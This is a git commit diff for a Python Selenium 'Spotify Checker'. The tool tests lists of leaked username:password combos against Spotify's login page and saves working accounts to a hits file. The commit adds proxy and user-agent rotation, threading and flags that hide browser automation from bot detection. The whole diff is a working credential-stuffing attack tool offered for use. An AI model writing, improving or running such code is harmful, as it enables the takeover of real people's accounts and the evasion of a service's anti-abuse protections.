e518e8e3414b6f5e6737b67cf1172c0da43bcd4e
onemanbuilds <72015638+onemanbuilds@users.noreply.github.com>
2020-11-06 10:57:07 +0100

    Update
    -Added title update
    -Added http proxy support
    -Added useragent rotation
    -Added max wait option (it was 20)
    -Added wait before start option
    -New ascii art
    -New printing

--- main.py
+++ main.py
@@ -1,40 +1,74 @@
 from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.by import By
+from selenium.common.exceptions import TimeoutException
 from time import sleep
 from concurrent.futures import ThreadPoolExecutor
-from colorama import init,Fore
-import os
-
-#[FIXED] known issue after quit not all of the chrome.exe process stops
+from colorama import init,Style,Fore
+from os import name,system
+from random import choice
+from threading import Thread,Lock
+from sys import stdout
 
 class Main:
     def clear(self):
-        if os.name == 'posix':
-            os.system('clear')
-        elif os.name in ('ce', 'nt', 'dos'):
-            os.system('cls')
+        if name == 'posix':
+            system('clear')
+        elif name in ('ce', 'nt', 'dos'):
+            system('cls')
         else:
             print("\n") * 120
 
     def SetTitle(self,title_name:str):
-        os.system("title {0}".format(title_name))
+        system("title {0}".format(title_name))
+
+    def TitleUpdate(self):
+        while True:
+            self.SetTitle('One Man Builds Spotify Checker Selenium Tool ^| HITS: {0} ^| BADS: {1} ^| RETRIES: {2}'.format(self.hits,self.bads,self.retries))
+            sleep(0.1)
+
+    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
+        self.lock.acquire()
+        stdout.flush()
+        text = text.encode('ascii','replace').decode()
+        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
+        self.lock.release()
+
+    def GetRandomUserAgent(self):
+        useragents = self.ReadFile('useragents.txt','r')
+        return choice(useragents)
+
+    def GetRandomProxy(self):
+        proxies_file = self.ReadFile('proxies.txt','r')
+        return choice(proxies_file)
 
     def __init__(self):
         self.clear()
-        self.SetTitle('One Man Builds Spotify Checker Selenium Tool (Proxyless)')
+        self.SetTitle('One Man Builds Spotify Checker Selenium Tool')
         init(convert=True)
-        title = Fore.YELLOW+"""
-                            
-                    ____ ___  ____ ___ _ ____ _   _    ____ _  _ ____ ____ _  _ ____ ____ 
-                    [__  |__] |  |  |  | |___  \_/     |    |__| |___ |    |_/  |___ |__/ 
-                    ___] |    |__|  |  | |      |      |___ |  | |___ |___ | \_ |___ |  \ 
-                                                                                        
-                            
+        self.lock = Lock()
+        self.hits = 0
+        self.bads = 0
+        self.retries = 0
+
+        title = Style.BRIGHT+Fore.RED+"""
+                                 ╔══════════════════════════════════════════════════╗
+                                      ╔═╗╔═╗╔═╗╔╦╗╦╔═╗╦ ╦  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
+                                      ╚═╗╠═╝║ ║ ║ ║╠╣ ╚╦╝  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
+                                      ╚═╝╩  ╚═╝ ╩ ╩╚   ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
+                                 ╚══════════════════════════════════════════════════╝
+
+
         """
         print(title)
-        self.browser_amount = int(input(Fore.YELLOW+'['+Fore.WHITE+'>'+Fore.YELLOW+'] How many browser would you like to run at the same time: '))
-        self.headless = int(input(Fore.YELLOW+'['+Fore.WHITE+'>'+Fore.YELLOW+'] Would you like to use Headless mode [1]yes [0]no: '))
+        self.use_proxy = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Proxy ['+Fore.RED+'0'+Fore.CYAN+']Proxyless: '))
+        self.headless = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Headless ['+Fore.RED+'0'+Fore.CYAN+']Not Headless: '))
+        self.max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Max Wait (seconds): '))
+        self.wait_before_start = float(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Wait Before Start (seconds): '))
+        self.browser_amount = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Threads: '))
         print('')
 
     def ReadFile(self,filename,method):
@@ -42,48 +76,72 @@ class Main:
             content = [line.strip('\n') for line in f]
             return content
 
-    def Login(self,combos):
+    def Login(self,username,password):
         try:
             options = Options()
-            
+
+            options.add_argument(f'--user-agent={self.GetRandomUserAgent()}')
+            options.add_argument('--no-sandbox')
+            options.add_argument('--log-level=3')
+            options.add_argument('--lang=en')
+
+            if self.use_proxy == 1:
+                options.add_argument('--proxy-server=http://{0}'.format(self.GetRandomProxy()))
+
             if self.headless == 1:
                 options.add_argument('--headless')
 
-            options.add_argument('no-sandbox')
-            options.add_argument('--log-level=3')
+            #Removes navigator.webdriver flag
             options.add_experimental_option('excludeSwitches', ['enable-logging','enable-automation'])
+            
+            # For older ChromeDriver under version 79.0.3945.16
+            options.add_experimental_option('useAutomationExtension', False)
+
+            options.add_argument("window-size=1280,800")
+
+            #For ChromeDriver version 79.0.3945.16 or over
+            options.add_argument('--disable-blink-features=AutomationControlled')
             driver = webdriver.Chrome(options=options)
-            username = combos.split(':')[0]
-            password = combos.split(':')[-1]
+
             driver.get('https://accounts.spotify.com/en/login/')
+            element_present = EC.presence_of_element_located((By.ID, 'login-username'))
+            WebDriverWait(driver, self.max_wait).until(element_present)
             username_elem = driver.find_element_by_id('login-username')
             username_elem.send_keys(username)
             password_elem = driver.find_element_by_id('login-password')
             password_elem.send_keys(password)
             login_button_elem = driver.find_element_by_id('login-button')
             login_button_elem.click()
-            sleep(1.25)
 
-            if driver.current_url == 'https://accounts.spotify.com/en/status':
-                print(Fore.GREEN+'['+Fore.WHITE+'!'+Fore.GREEN+'] HIT | {0}:{1}'.format(username,password))
-                with open('hits.txt','a') as f:
-                    f.write('{0}:{1}\n'.format(username,password))
-            else:
-                print(Fore.RED+'['+Fore.WHITE+'-'+Fore.RED+'] BAD | {0}:{1}'.format(username,password))
-                with open('bads.txt','a') as f:
-                    f.write('{0}:{1}\n'.format(username,password))
+            try:
+                element_present = EC.url_to_be('https://accounts.spotify.com/en/status')
+                WebDriverWait(driver, self.max_wait).until(element_present)
+                self.PrintText(Fore.CYAN,Fore.RED,'HIT',f'{username}:{password}')
+                with open('hits.txt','a',encoding='utf8') as f:
+                    f.write(f'{username}:{password}\n')
+                self.hits += 1
+            except TimeoutException:
+                self.PrintText(Fore.RED,Fore.CYAN,'BAD',f'{username}:{password}')
+                with open('bads.txt','a',encoding='utf8') as f:
+                    f.write(f'{username}:{password}\n')
+                self.bads += 1
+                
         except:
-            self.Login(combos)
-        finally:
+            self.retries += 1
             driver.quit()
+            self.Login(username,password)
         
 
     def Start(self):
+        Thread(target=self.TitleUpdate).start()
         combos = self.ReadFile('combos.txt','r')
         with ThreadPoolExecutor(max_workers=self.browser_amount) as ex:
             for combo in combos:
-                ex.submit(self.Login,combo)
-
+                username = combo.split(':')[0]
+                password = combo.split(':')[-1]
+                ex.submit(self.Login,username,password)
+                if self.wait_before_start > 0:
+                    sleep(self.wait_before_start)
 
 if __name__ == '__main__':
     main = Main()
